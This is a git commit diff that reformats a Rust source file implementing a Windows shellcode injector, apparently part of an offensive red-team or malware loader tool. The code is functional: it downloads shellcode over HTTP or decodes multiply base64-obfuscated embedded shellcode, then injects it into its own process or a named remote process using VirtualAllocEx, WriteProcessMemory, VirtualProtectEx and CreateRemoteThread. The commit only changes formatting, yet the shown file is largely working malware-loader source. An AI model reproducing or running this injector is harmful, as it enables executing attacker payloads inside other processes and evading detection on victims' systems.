46d2ea429b5fa4ef0b3d330f60597aa1fdf9280b
Michael Taggart <mtaggart@taggart-tech.com>
2023-08-05 06:32:35 -0700

    Rustfmt, pt. 2

--- src/injectors/mod.rs
+++ src/injectors/mod.rs
@@ -1,92 +1,78 @@
 // ================
 // Standard Library
 // ================
-use std::ptr;
 use core::ffi::c_void;
+use std::ptr;
 // =====================
 // External Dependencies
 // =====================
-use windows::{
-    Win32::{
-        Foundation::{
-            CloseHandle,
-            GetLastError,
-            HANDLE,
-            WIN32_ERROR,
-            BOOL
+use base64::{engine::general_purpose, Engine as _};
+use reqwest::blocking::get;
+use sysinfo::{PidExt, ProcessExt, System, SystemExt};
+use windows::Win32::{
+    Foundation::{CloseHandle, GetLastError, BOOL, HANDLE, WIN32_ERROR},
+    System::{
+        Diagnostics::Debug::WriteProcessMemory,
+        Memory::{
+            VirtualAllocEx, VirtualProtectEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ,
+            PAGE_PROTECTION_FLAGS, PAGE_READWRITE,
         },
-        System::{
-            Diagnostics::Debug::WriteProcessMemory,
-            Memory::{
-                VirtualAllocEx, 
-                VirtualProtectEx,
-                MEM_COMMIT,
-                MEM_RESERVE,
-                PAGE_PROTECTION_FLAGS,
-                PAGE_READWRITE,
-                PAGE_EXECUTE_READ,
-            },
-            Threading::{
-                INFINITE,
-                OpenProcess,
-                CreateRemoteThread,
-                GetCurrentProcess,
-                PROCESS_ALL_ACCESS,
-                WaitForSingleObject
-            }
-        }
+        Threading::{
+            CreateRemoteThread, GetCurrentProcess, OpenProcess, WaitForSingleObject, INFINITE,
+            PROCESS_ALL_ACCESS,
+        },
     },
 };
-use sysinfo::{ProcessExt, System, SystemExt, PidExt};
-use reqwest::blocking::get;
-use base64::{Engine as _, engine::general_purpose};
 
 ///
-/// A handy container for our shellcode. This is [InjectionType] and 
+/// A handy container for our shellcode. This is [InjectionType] and
 /// [InjectorType] agnostic, beacuse our helpful [load()] function will
 /// handle the transformation from source to shellcode.
-/// 
+///
 pub struct Injector {
-    pub shellcode: Vec<u8>
+    pub shellcode: Vec<u8>,
 }
-
 
 ///
 /// The possible types of shellcode loaders. They are:
-/// 
+///
 /// * `Url`: Raw Shellcode over HTTP(S)
 /// * `Base64Url`: B64-encoded (n-iterations) over HTTP(S)
-/// * `Embedded`: You give the loader a raw [Vec<u8>] 
+/// * `Embedded`: You give the loader a raw [Vec<u8>]
 ///    of shellcode to inject
 /// * `Base64Embedded`: Instead of a raw [Vec], you use b64
 ///    (n-iterations) to create an obfuscated shellcode string,
 ///    which will be decoded at runtime
-/// 
+///
 pub enum InjectorType {
     Url(String),
     Base64Url((String, usize)),
     Embedded(Vec<u8>),
-    Base64Embedded((String, usize))
+    Base64Embedded((String, usize)),
 }
 
 ///
-/// The possible types of injections. Currently only 
+/// The possible types of injections. Currently only
 /// `Reflective` and `Remote` are supported.
-/// 
+///
 pub enum InjectionType {
     Reflect,
-    Remote(String)
+    Remote(String),
 }
 
 ///
 /// The generic function to write memory to either
 /// our own our another process, depending on the handle.
-/// 
-pub unsafe fn write_mem(sc: Vec<u8>, proc_h: HANDLE, base_addr: *mut c_void, wait: bool) -> Result<(), String> {
-
+///
+pub unsafe fn write_mem(
+    sc: Vec<u8>,
+    proc_h: HANDLE,
+    base_addr: *mut c_void,
+    wait: bool,
+) -> Result<(), String> {
     let sc_len = sc.len();
     let mut n = 0;
-    WriteProcessMemory(proc_h, base_addr, sc.as_ptr() as  _, sc_len, Some(&mut n));
+    WriteProcessMemory(proc_h, base_addr, sc.as_ptr() as _, sc_len, Some(&mut n));
 
     let mut old_protect: PAGE_PROTECTION_FLAGS = PAGE_READWRITE;
     VirtualProtectEx(
@@ -94,22 +80,20 @@ pub unsafe fn write_mem(sc: Vec<u8>, proc_h: HANDLE, base_addr: *mut c_void, wai
         base_addr,
         sc_len,
         PAGE_EXECUTE_READ,
-        &mut old_protect
+        &mut old_protect,
     );
 
-    
     let h_thread = CreateRemoteThread(
-        proc_h, 
-        None, 
-        0, 
-        Some(std::mem::transmute(base_addr)), 
+        proc_h,
         None,
-        0, 
-        None
+        0,
+        Some(std::mem::transmute(base_addr)),
+        None,
+        0,
+        None,
     )
     .unwrap();
-    
-    
+
     CloseHandle(proc_h);
 
     if wait {
@@ -125,7 +109,6 @@ pub unsafe fn write_mem(sc: Vec<u8>, proc_h: HANDLE, base_addr: *mut c_void, wai
     } else {
         Ok(())
     }
-
 }
 
 ///
@@ -133,34 +116,45 @@ pub unsafe fn write_mem(sc: Vec<u8>, proc_h: HANDLE, base_addr: *mut c_void, wai
 ///  
 pub unsafe fn reflective_inject(sc: Vec<u8>, wait: bool) -> Result<(), String> {
     let h: HANDLE = GetCurrentProcess();
-    let addr = VirtualAllocEx(h, Some(ptr::null_mut()), sc.len(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-        
+    let addr = VirtualAllocEx(
+        h,
+        Some(ptr::null_mut()),
+        sc.len(),
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_READWRITE,
+    );
+
     write_mem(sc, h, addr, wait)
-       
 }
 
 ///
 /// Performs remote injection.
-/// 
+///
 /// Will attempt to find a process with the given name and inject.
 ///  
-pub unsafe fn remote_inject(sc: Vec<u8>, wait: bool, process_name: &str) -> Result<(), String>{
-
-
+pub unsafe fn remote_inject(sc: Vec<u8>, wait: bool, process_name: &str) -> Result<(), String> {
     // Enumerate processes
     let sys = System::new_all();
-    let mut process_matches = sys.processes()
+    let mut process_matches = sys
+        .processes()
         .iter()
-        .filter(|(&_pid, &ref proc)| proc.name() == process_name );
+        .filter(|(&_pid, proc)| proc.name() == process_name);
 
-    match process_matches.nth(0) {
+    match process_matches.next() {
         Some((pid, _proc)) => {
-            let h: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, BOOL(0), pid.to_owned().as_u32()).unwrap();
-            let addr = VirtualAllocEx(h, Some(ptr::null_mut()), sc.len(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);              
+            let h: HANDLE =
+                OpenProcess(PROCESS_ALL_ACCESS, BOOL(0), pid.to_owned().as_u32()).unwrap();
+            let addr = VirtualAllocEx(
+                h,
+                Some(ptr::null_mut()),
+                sc.len(),
+                MEM_COMMIT | MEM_RESERVE,
+                PAGE_READWRITE,
+            );
             write_mem(sc, h, addr, wait)
-        },
-        None => Err("Could not find matching process!".to_string())
-    }   
+        }
+        None => Err("Could not find matching process!".to_string()),
+    }
 }
 
 pub fn download_shellcode(url: &str) -> Result<Vec<u8>, String> {
@@ -181,12 +175,13 @@ pub fn decode_b64_shellcode(sc: &Vec<u8>, b64_iterations: usize) -> Result<Vec<u
         match general_purpose::STANDARD.decode(shellcode_vec) {
             Ok(d) => {
                 shellcode_vec = d;
-            },
-            Err(e) => { 
+            }
+            Err(e) => {
                 let err_msg = e.to_string();
-                return Err(err_msg.to_owned()); 
+                return Err(err_msg.to_owned());
             }
         };
     }
     Ok(shellcode_vec)
 }
+
